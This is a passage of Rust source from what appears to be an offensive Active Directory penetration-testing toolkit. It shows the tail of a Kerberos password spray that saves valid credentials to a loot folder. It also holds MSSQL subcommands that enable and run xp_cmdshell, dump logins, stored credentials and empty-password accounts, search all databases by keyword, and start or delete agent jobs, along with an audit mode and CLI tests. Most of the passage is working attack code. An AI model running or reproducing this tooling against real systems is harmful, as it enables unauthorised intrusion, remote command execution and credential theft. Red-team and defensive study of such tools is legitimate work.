                if err_str.contains("KDC_ERR_CLIENT_REVOKED") || err_str.contains("LOCKED") {
                    println!(
                        "  {} {} — {}",
                        "⚠".yellow(),
                        user,
                        "LOCKED OUT".red().bold()
                    );
                    locked_out += 1;
                    if locked_out >= 3 {
                        banner::print_fail(
                            "3+ lockouts detected — aborting spray to avoid mass lockout",
                        );
                        return 1;
                    }
                } else {
                    tracing::debug!("  {} {}: {}", "✗".dimmed(), user, err_str);
                }
            }
        }
    }

    // Write valid creds to file
    if !valid_creds.is_empty() {
        let loot_dir = std::path::PathBuf::from("./loot");
        let _ = std::fs::create_dir_all(&loot_dir);
        let creds_file = loot_dir.join("spray_valid_creds.txt");
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&creds_file)
        {
            use std::io::Write;
            for user in &valid_creds {
                let _ = writeln!(f, "{}\\{}:{}", domain, user, password);
            }
        }
        banner::print_success(&format!(
            "{}/{} valid creds found! Written to ./loot/spray_valid_creds.txt",
            valid_creds.len(),
            users.len()
        ));
    } else {
        println!(
            "\n{} 0/{} valid credentials found",
            "→".dimmed(),
            users.len()
        );
    }
    0
}

// `autopwn` command removed; `autopwn.rs` remains as reference but autopwn execution
// is intentionally disabled. Wizard remains the interactive/autonomous interface.

// cmd_mssql
async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
    use overthrone_core::mssql::{MssqlClient, MssqlConfig};

    banner::print_module_banner("MSSQL");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let password = match creds.password() {
        Some(p) => p.to_string(),
        None => {
            banner::print_fail(
                "MSSQL TDS authentication requires a plaintext password; \
                NT hash and Kerberos ticket auth are not supported over TDS",
            );
            return 1;
        }
    };

    if let Some(p) = proxy {
        banner::print_info(&format!("Using SOCKS5 proxy: {}", p));
    }

    match action {
        MssqlAction::Query {
            target,
            query,
            database,
        } => {
            println!(
                "{} Querying {} — database: {} — sql: {}",
                "🗄".bright_black(),
                target.cyan(),
                database.cyan(),
                query.yellow()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database(&database)
                .with_proxy(proxy);
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.query(&query).await {
                Ok(result) => {
                    if result.columns.is_empty() {
                        banner::print_info("Query returned no columns");
                    } else {
                        let header = result.columns.join(" | ");
                        println!("{}", header.bold());
                        println!("{}", "-".repeat(header.len()));
                        for row in &result.rows {
                            let vals: Vec<&str> =
                                row.iter().map(|v| v.as_deref().unwrap_or("NULL")).collect();
                            println!("{}", vals.join(" | "));
                        }
                        banner::print_success(&format!("{} row(s) returned", result.rows.len()));
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Query failed: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
        MssqlAction::XpCmdShell { target, command } => {
            println!(
                "{} Executing xp_cmdshell on {} — command: {}",
                "⚡".bright_black(),
                target.cyan(),
                command.yellow()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database("master")
                .with_proxy(proxy);
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.execute_xp_cmdshell(&command).await {
                Ok(output) => {
                    if output.is_empty() {
                        banner::print_info("Command produced no output");
                    } else {
                        println!("{}", output);
                    }
                    banner::print_success("xp_cmdshell executed");
                }
                Err(e) => {
                    banner::print_fail(&format!("xp_cmdshell failed: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
        MssqlAction::LinkedServers { target } => {
            println!(
                "{} Enumerating linked servers on {}",
                "🔗".bright_black(),
                target.cyan()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database("master")
                .with_proxy(proxy);
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.enumerate_linked_servers().await {
                Ok(servers) => {
                    if servers.is_empty() {
                        banner::print_info("No linked servers found");
                    } else {
                        for srv in &servers {
                            print!(
                                "  {} {} | source: {} | provider: {}",
                                "→".cyan(),
                                srv.name.bold(),
                                srv.data_source.yellow(),
                                srv.provider.bright_black()
                            );
                            if srv.rpc_out_enabled {
                                print!("  [RPC-out]");
                            }
                            if srv.data_access_enabled {
                                print!("  [data-access]");
                            }
                            println!();
                        }
                        banner::print_success(&format!("{} linked server(s) found", servers.len()));
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Linked server enumeration failed: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
        MssqlAction::EnableXpCmdShell { target } => {
            println!(
                "{} Enabling xp_cmdshell on {}",
                "🔓".bright_black(),
                target.cyan()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database("master")
                .with_proxy(proxy);
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.enable_xp_cmdshell().await {
                Ok(()) => {
                    banner::print_success("xp_cmdshell enabled successfully");
                }
                Err(e) => {
                    banner::print_fail(&format!("Failed to enable xp_cmdshell: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
        MssqlAction::CheckXpCmdShell { target } => {
            println!(
                "{} Checking xp_cmdshell status on {}",
                "🔍".bright_black(),
                target.cyan()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database("master")
                .with_proxy(proxy);
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.check_xp_cmdshell().await {
                Ok(enabled) => {
                    if enabled {
                        banner::print_success("xp_cmdshell is ENABLED");
                    } else {
                        banner::print_info("xp_cmdshell is DISABLED");
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Status check failed: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
        MssqlAction::Audit {
            targets,
            crawl_links,
            output,
        } => {
            println!("{} Running MSSQL security audit...", ">".bright_black());
            println!("  Target(s): {}", targets.join(", "));
            if crawl_links {
                println!("  Linked server crawling: enabled");
            }

            use overthrone_reaper::mssql_audit::build_mssql_audit_checks;
            let checks = build_mssql_audit_checks();
            println!("  {} checks configured", checks.len());

            let mut all_findings: Vec<serde_json::Value> = Vec::new();

            for target in &targets {
                println!("{} Auditing {}...", ">".bright_black(), target.cyan());

                let config = MssqlConfig::new(target.as_str())
                    .with_ntlm_auth(&creds.domain, &creds.username, &password)
                    .with_database("master")
                    .with_proxy(proxy);
                let mut client = match MssqlClient::connect(config).await {
                    Ok(c) => c,
                    Err(e) => {
                        banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                        continue;
                    }
                };

                let mut server_findings: Vec<serde_json::Value> = Vec::new();
                for check in &checks {
                    match client.query(&check.query).await {
                        Ok(results) => {
                            let vulnerable = !results.rows.is_empty();
                            if vulnerable {
                                let finding = serde_json::json!({
                                    "server": target,
                                    "check": check.name,
                                    "category": format!("{:?}", check.category),
                                    "description": check.description,
                                    "finding": check.finding,
                                    "remediation": check.remediation,
                                    "severity": format!("{:?}", check.severity),
                                });
                                println!(
                                    "  {} [{}] {}",
                                    match check.severity {
                                        overthrone_reaper::mssql_audit::Severity::Critical =>
                                            "🔴".to_string(),
                                        overthrone_reaper::mssql_audit::Severity::High =>
                                            "🟠".to_string(),
                                        overthrone_reaper::mssql_audit::Severity::Medium =>
                                            "🟡".to_string(),
                                        _ => "🔵".to_string(),
                                    },
                                    check.name,
                                    check.description.bright_black()
                                );
                                server_findings.push(finding);
                            }
                        }
                        Err(e) => {
                            println!("  {} {} check error: {}", "!".yellow(), check.name, e);
                        }
                    }
                }

                let _ = client.close().await;

                banner::print_success(&format!(
                    "{}: {} vulnerability(ies) found",
                    target,
                    server_findings.len()
                ));
                all_findings.extend(server_findings);
            }

            if let Some(out_path) = output {
                let json = serde_json::to_string_pretty(&serde_json::json!({
                    "targets": &targets,
                    "crawl_links": crawl_links,
                    "total_checks": checks.len(),
                    "findings_count": all_findings.len(),
                    "findings": &all_findings,
                }))
                .unwrap_or_default();
                let path = out_path.clone();
                match tokio::fs::write(&path, json.as_bytes()).await {
                    Ok(_) => banner::print_success(&format!("Audit written to {}", out_path)),
                    Err(e) => banner::print_fail(&format!("Failed to write audit: {}", e)),
                }
            }
        }
        MssqlAction::DumpCredentials { target, database } => {
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database(database.as_str())
                .with_proxy(proxy);
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect failed: {}", e));
                    return 1;
                }
            };

            banner::print_info("SQL Server Logins:");
            if let Ok(result) = client.query(
                "SELECT name, principal_id, type_desc, is_disabled, is_policy_checked, is_expiration_checked FROM sys.sql_logins ORDER BY name"
            ).await {
                for row in &result.rows {
                    let name = row.first().and_then(|v| v.as_deref()).unwrap_or("?");
                    let disabled = row.get(3).and_then(|v| v.as_deref()).unwrap_or("?");
                    println!("  {} | disabled:{}", name.cyan(), disabled.yellow());
                }
                if !result.rows.is_empty() {
                    banner::print_success(&format!("{} SQL login(s) found", result.rows.len()));
                }
            }

            banner::print_info("Stored Credentials:");
            if let Ok(result) = client
                .query("SELECT name, credential_identity FROM sys.credentials ORDER BY name")
                .await
            {
                for row in &result.rows {
                    let name = row.first().and_then(|v| v.as_deref()).unwrap_or("?");
                    let ident = row.get(1).and_then(|v| v.as_deref()).unwrap_or("?");
                    println!("  {} -> identity: {}", name.cyan(), ident.yellow());
                }
            }

            banner::print_info("Linked Server Mappings:");
            if let Ok(result) = client.query(
                "SELECT s.name, l.remote_name, l.uses_self_credential FROM sys.servers s JOIN sys.linked_logins l ON s.server_id = l.server_id WHERE s.is_linked = 1"
            ).await {
                for row in &result.rows {
                    let srv = row.first().and_then(|v| v.as_deref()).unwrap_or("?");
                    let remote = row.get(1).and_then(|v| v.as_deref()).unwrap_or("?");
                    let self_cred = row.get(2).and_then(|v| v.as_deref()).unwrap_or("0");
                    println!("  {} -> remote: {} [self_credential: {}]", srv.cyan(), remote.yellow(), self_cred);
                }
            }

            banner::print_info("Empty Password Check:");
            if let Ok(result) = client
                .query("SELECT name FROM sys.sql_logins WHERE PWDCOMPARE('', password_hash) = 1")
                .await
            {
                for row in &result.rows {
                    let name = row.first().and_then(|v| v.as_deref()).unwrap_or("?");
                    println!("  {} — EMPTY PASSWORD", name.red().bold());
                }
                if result.rows.is_empty() {
                    banner::print_info("No empty-password logins");
                }
            }

            let _ = client.close().await;
        }
        MssqlAction::Search {
            target,
            keyword,
            regex,
            database,
            max_rows,
        } => {
            if keyword.is_none() && regex.is_none() {
                banner::print_fail("Specify --keyword or --regex for content search");
                return 1;
            }

            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database(database.as_deref().unwrap_or("master"))
                .with_proxy(proxy);
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect failed: {}", e));
                    return 1;
                }
            };

            let dbs: Vec<String> = match database {
                Some(ref db) => vec![db.clone()],
                None => match client.query(
                    "SELECT name FROM sys.databases WHERE database_id > 4 AND state = 0 ORDER BY name"
                ).await {
                    Ok(r) => r.rows.iter().filter_map(|row| row.first().and_then(|v| v.clone())).collect(),
                    Err(e) => { banner::print_fail(&format!("Failed: {}", e)); let _ = client.close().await; return 1; }
                }
            };

            if dbs.is_empty() {
                banner::print_info("No user databases");
                let _ = client.close().await;
                return 0;
            }

            let mut total = 0usize;
            for db in &dbs {
                let _ = client.query(&format!("USE [{}]", db)).await;
                let tables = match client.query(
                    "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_SCHEMA != 'sys'"
                ).await {
                    Ok(r) => r.rows,
                    Err(_) => continue,
                };

                for t in &tables {
                    let schema = t.first().and_then(|v| v.as_deref()).unwrap_or("dbo");
                    let table = t.get(1).and_then(|v| v.as_deref()).unwrap_or("?");
                    let full = format!("{}.{}", schema, table);

                    let cols = match client.query(&format!(
                        "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{}' \
                         AND TABLE_NAME='{}' AND DATA_TYPE IN ('varchar','nvarchar','text','ntext','char','nchar')",
                        schema.replace('\'', "''"), table.replace('\'', "''")
                    )).await {
                        Ok(r) => r.rows,
                        Err(_) => continue,
                    };

                    let col_names: Vec<String> = cols
                        .iter()
                        .filter_map(|r| r.first().and_then(|v| v.clone()))
                        .collect();
                    if col_names.is_empty() {
                        continue;
                    }

                    let term = match (&keyword, &regex) {
                        (Some(kw), _) => col_names
                            .iter()
                            .map(|c| format!("{} LIKE '%{}%'", c, kw.replace('\'', "''")))
                            .collect::<Vec<_>>()
                            .join(" OR "),
                        (_, Some(rx)) => col_names
                            .iter()
                            .map(|c| format!("{} LIKE '%{}%'", c, rx.replace('\'', "''")))
                            .collect::<Vec<_>>()
                            .join(" OR "),
                        _ => {
                            banner::print_fail("No --keyword or --regex provided for search");
                            return 1;
                        }
                    };

                    match client
                        .query(&format!(
                            "SELECT TOP {} {} FROM {} WHERE {}",
                            max_rows,
                            col_names.join(", "),
                            full,
                            term
                        ))
                        .await
                    {
                        Ok(sr) if !sr.rows.is_empty() => {
                            total += sr.rows.len();
                            println!("  {} ({} hits)", full.cyan(), sr.rows.len());
                            for row in &sr.rows {
                                println!(
                                    "    {}",
                                    row.iter()
                                        .map(|v| v.as_deref().unwrap_or("NULL"))
                                        .collect::<Vec<_>>()
                                        .join(" | ")
                                        .bright_black()
                                );
                            }
                        }
                        _ => {}
                    }
                }
            }
            if total == 0 {
                banner::print_info("No matches");
            } else {
                banner::print_success(&format!("{} match(es)", total));
            }
            let _ = client.close().await;
        }
        MssqlAction::AgentJob {
            target,
            action,
            name,
        } => {
            println!(
                "{} Managing jobs on {} — action: {}",
                ">".bright_black(),
                target.cyan(),
                action.yellow()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database("msdb")
                .with_proxy(proxy);
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect failed: {}", e));
                    return 1;
                }
            };

            match action.as_str() {
                "list" => match client.query(
                    "SELECT j.name, j.enabled, j.description, SUSER_SNAME(j.owner_sid) AS owner, \
                     COUNT(js.step_id) AS steps FROM msdb.dbo.sysjobs j \
                     LEFT JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id \
                     GROUP BY j.name, j.enabled, j.description, j.owner_sid ORDER BY j.name"
                ).await {
                    Ok(r) if !r.rows.is_empty() => {
                        for row in &r.rows {
                            println!("  {} | owner: {} | steps: {} | {}",
                                row.first().and_then(|v| v.as_deref()).unwrap_or("?").cyan(),
                                row.get(3).and_then(|v| v.as_deref()).unwrap_or("?").yellow(),
                                row.get(4).and_then(|v| v.as_deref()).unwrap_or("0"),
                                if row.get(1).and_then(|v| v.as_deref()) == Some("1") { "ENABLED".green() } else { "DISABLED".bright_black() }
                            );
                        }
                    }
                    Ok(_) => banner::print_info("No jobs found"),
                    Err(e) => banner::print_fail(&format!("List failed: {}", e)),
                },
                act @ ("start" | "stop" | "delete") => {
                    let job_name = match name.as_deref() {
                        Some(n) => n,
                        None => { banner::print_fail("--name required"); let _ = client.close().await; return 1; }
                    };
                    let sp = match act {
                        "start" => "sp_start_job",
                        "stop" => "sp_stop_job",
                        _ => "sp_delete_job",
                    };
                    match client.execute(&format!("EXEC msdb.dbo.{} @job_name = N'{}'", sp, job_name.replace('\'', "''"))).await {
                        Ok(_) => banner::print_success(&format!("Job '{}' {}", job_name, act)),
                        Err(e) => banner::print_fail(&format!("Failed to {} '{}': {}", act, job_name, e)),
                    }
                }
                other => banner::print_fail(&format!("Unknown action '{}'. Use: list, start, stop, delete", other)),
            }
            let _ = client.close().await;
        }
    }
    0
}

/// Returns a list of compiled-in feature modules.
#[allow(clippy::vec_init_then_push)]
pub fn compiled_modules() -> Vec<&'static str> {
    let mut modules = Vec::new();
    #[cfg(feature = "hunter")]
    modules.push("hunter");
    #[cfg(feature = "forge")]
    modules.push("forge");
    #[cfg(feature = "relay")]
    modules.push("relay");
    #[cfg(feature = "pilot")]
    modules.push("pilot");
    #[cfg(feature = "reaper")]
    modules.push("reaper");
    #[cfg(feature = "crawler")]
    modules.push("crawler");
    #[cfg(feature = "viewer")]
    modules.push("viewer");
    #[cfg(feature = "scribe")]
    modules.push("scribe");
    modules
}

#[cfg(test)]
mod cli_parse_tests {
    use super::*;
    use std::collections::HashMap;
    use std::time::{SystemTime, UNIX_EPOCH};

    #[test]
    fn report_output_flag_keeps_string_type_and_public_name() {
        let cli = Cli::try_parse_from([
            "ovt",
            "report",
            "--input",
            "engagement.json",
            "--output",
            "owner-report.md",
            "--format",
            "markdown",
        ])
        .expect("report command should parse --output without clap type mismatch");

        match *cli.command {
            Commands::Report {
                ref input,
                ref output,
                format: ReportFormat::Markdown,
            } => {
                assert_eq!(input, "engagement.json");
                assert_eq!(output, "owner-report.md");
            }
            _ => panic!("expected parsed report command"),
        }
    }

    #[test]
    fn kerberos_user_enum_output_flag_keeps_optional_type_and_public_name() {
        let cli = Cli::try_parse_from([
            "ovt",
            "kerberos",
            "user-enum",
            "-H",
            "127.0.0.1",
            "-d",
            "example.local",
            "-U",
            "users.txt",
            "-o",
            "valid-users.txt",
            "--delay",
            "10",
        ])
        .expect("kerberos user-enum should parse -o/--output without clap type mismatch");

        match *cli.command {
            Commands::Kerberos {
                action:
                    KerberosAction::UserEnum {
                        ref userlist,
                        ref output,
                        delay,
                        concurrency,
                        use_ldap,
                    },
            } => {
                assert_eq!(userlist.as_deref(), Some("users.txt"));
                assert_eq!(output.as_deref(), Some("valid-users.txt"));
                assert_eq!(delay, 10);
                assert_eq!(concurrency, 10);
                assert!(!use_ldap);
            }
            _other => panic!("expected Kerberos::UserEnum, got different variant"),
        }
    }

    #[test]
    fn persist_enumeration_results_writes_dedicated_powerview_artifact() {
        let loot_root = std::env::temp_dir().join(format!(
            "ovt-enum-test-{}",
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("system clock should be after UNIX epoch")
                .as_nanos()
        ));

        let result = overthrone_reaper::runner::ReaperResult {
            domain: "example.local".to_string(),
            base_dn: "DC=example,DC=local".to_string(),
            functional_level: Some(7),
            users: Vec::new(),
            groups: Vec::new(),
            computers: Vec::new(),
            ous: Vec::new(),
            gpos: Vec::new(),
            trusts: Vec::new(),
            policy: None,
            spn_accounts: Vec::new(),
            delegations: Vec::new(),
            acl_findings: Vec::new(),
            laps_entries: Vec::new(),
            gmsa_entries: Vec::new(),
            mssql_instances: Vec::new(),
            snaffle_findings: Vec::new(),
            powerview_results: Some(overthrone_reaper::powerview::PowerViewResult {
                gpo_details: vec![overthrone_reaper::powerview::GpoDetailedInfo {
                    display_name: "Default Domain Policy".to_string(),
                    gpo_guid: "{11111111-1111-1111-1111-111111111111}".to_string(),
                    path: "\\\\example.local\\SysVol\\Policies\\{11111111-1111-1111-1111-111111111111}".to_string(),
                    status: "Enabled".to_string(),
                    linked_to: vec!["DC=example,DC=local".to_string()],
                }],
                user_details: vec![overthrone_reaper::powerview::UserDetailedInfo {
                    sam_account_name: "alice".to_string(),
                    distinguished_name: "CN=Alice,CN=Users,DC=example,DC=local".to_string(),
                    sid: "S-1-5-21-1-2-3-1001".to_string(),
                    pwd_last_set: "13371337".to_string(),
                    last_logon: "0".to_string(),
                    member_of: vec!["CN=Domain Users,CN=Users,DC=example,DC=local".to_string()],
                    properties: HashMap::new(),
                }],
            }),
            adcs_templates: Vec::new(),
        };

        let written_files = persist_enumeration_results(&result, &loot_root)
            .expect("should write enumeration results to temp loot directory");

        assert!(loot_root.join("enumeration_results.json").exists());
        assert!(loot_root.join("powerview_results.json").exists());
        assert_eq!(written_files.len(), 2);

        let powerview_json = std::fs::read_to_string(loot_root.join("powerview_results.json"))
            .expect("powerview artifact should be readable");
        assert!(powerview_json.contains("Default Domain Policy"));
        assert!(powerview_json.contains("alice"));

        let _ = std::fs::remove_dir_all(&loot_root);
    }
}
